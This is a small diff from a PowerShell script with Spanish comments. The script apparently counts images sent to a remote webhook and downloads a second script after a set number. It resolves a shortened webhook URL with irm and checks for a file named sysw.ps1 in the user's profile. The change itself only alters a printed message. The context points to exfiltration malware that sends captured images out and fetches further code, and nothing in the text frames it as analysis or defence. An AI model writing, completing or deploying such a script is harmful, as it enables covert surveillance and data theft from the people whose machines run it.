@@ -4,7 +4,7 @@ $a = 0 # Contador de imágenes enviadas al webhook
 $maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
 # Detección de URL acortada
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; $hookurl = (irm $hookurl).url}
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!xxx..." ; $hookurl = (irm $hookurl).url}
 
 # Verificar si el archivo principal ya existe
 $syswPath = "$env:USERPROFILE\sysw.ps1"
